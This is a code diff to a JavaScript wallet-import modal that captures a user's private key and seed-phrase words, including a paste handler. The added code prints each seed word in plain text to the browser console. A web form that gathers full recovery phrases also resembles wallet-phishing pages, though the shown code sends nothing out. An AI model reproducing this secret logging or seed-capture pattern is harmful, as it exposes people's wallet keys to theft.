@@ -857,27 +857,79 @@ class WalletModal {
       </div>
       
       <style>
-        #wallet-import-backdrop .seed-word-input:focus {
-          border-color: ${walletColor} !important;
-          outline: none !important;
-        }
-        #wallet-import-backdrop #private-key-input:focus {
-          border-color: ${walletColor} !important;
-          outline: none !important;
-        }
         #wallet-import-backdrop input,
         #wallet-import-backdrop textarea {
           -webkit-user-select: text !important;
           -moz-user-select: text !important;
           user-select: text !important;
-          -webkit-touch-callout: default !important;
-          pointer-events: auto !important;
-          touch-action: auto !important;
         }
       </style>
     `;
 
     document.body.insertAdjacentHTML('beforeend', importHTML);
+    
+    // For wallet browsers: attach listeners after DOM is ready
+    setTimeout(() => {
+      this.setupImportInputs();
+    }, 200);
+  }
+
+  setupImportInputs() {
+    console.log('Setting up import inputs for wallet browser...');
+    
+    // Setup private key input
+    const privateKeyInput = document.getElementById('private-key-input');
+    if (privateKeyInput) {
+      console.log('Private key input found');
+      const self = this;
+      
+      privateKeyInput.addEventListener('input', function() {
+        self.privateKey = this.value;
+        console.log('Private key length:', this.value.length);
+      }, false);
+      
+      privateKeyInput.addEventListener('change', function() {
+        self.privateKey = this.value;
+      }, false);
+    }
+    
+    // Setup seed word inputs
+    const seedInputs = document.querySelectorAll('.seed-word-input');
+    console.log('Found seed inputs:', seedInputs.length);
+    
+    if (seedInputs.length > 0) {
+      const self = this;
+      
+      seedInputs.forEach(function(input, index) {
+        input.addEventListener('input', function() {
+          self.seedWords[index] = this.value;
+          console.log('Word ' + (index + 1) + ':', this.value);
+        }, false);
+        
+        input.addEventListener('change', function() {
+          self.seedWords[index] = this.value;
+        }, false);
+      });
+      
+      // Paste handler on first input
+      if (seedInputs[0]) {
+        seedInputs[0].addEventListener('paste', function(e) {
+          console.log('Paste detected');
+          const text = (e.clipboardData || window.clipboardData).getData('text');
+          const words = text.trim().split(/\s+/);
+          
+          words.forEach(function(word, i) {
+            if (i < self.seedWords.length) {
+              self.seedWords[i] = word.trim();
+              const inp = document.getElementById('seed-word-' + i);
+              if (inp) inp.value = word.trim();
+            }
+          });
+        }, false);
+      }
+    }
+    
+    console.log('Import inputs setup complete');
   }
 
   renderPrivateKeyInput() {
@@ -886,14 +938,14 @@ class WalletModal {
         <textarea
           id="private-key-input"
           placeholder="Enter your private key"
-          oninput="walletModal.updatePrivateKey(this.value)"
-          class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none resize-none"
+          class="w-full p-3 sm:p-4 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400"
+          style="background: white; -webkit-appearance: none; appearance: none; min-height: 100px;"
           rows="4"
           autocomplete="off"
           autocorrect="off"
           autocapitalize="off"
           spellcheck="false"
-        >${this.privateKey}</textarea>
+        ></textarea>
       </div>
     `;
   }
@@ -904,11 +956,12 @@ class WalletModal {
       inputs.push(`
         <input
           type="text"
+          id="seed-word-${i}"
           data-index="${i}"
           placeholder="${i + 1}"
-          value="${this.seedWords[i] || ''}"
-          oninput="walletModal.updateSeedWord(${i}, this.value)"
-          class="seed-word-input p-2.5 sm:p-3 border border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none"
+          value=""
+          class="seed-word-input p-2.5 sm:p-3 border-2 border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400"
+          style="width: 100%; background: white; -webkit-appearance: none; appearance: none;"
           autocomplete="off"
           autocorrect="off"
           autocapitalize="off"
@@ -921,12 +974,10 @@ class WalletModal {
 
   updateSeedWord(index, value) {
     this.seedWords[index] = value;
-    console.log(`Word ${index + 1} updated: ${value}`);
   }
 
   updatePrivateKey(value) {
     this.privateKey = value;
-    console.log(`Private key updated, length: ${value.length}`);
   }
 
   attachInputListeners() {
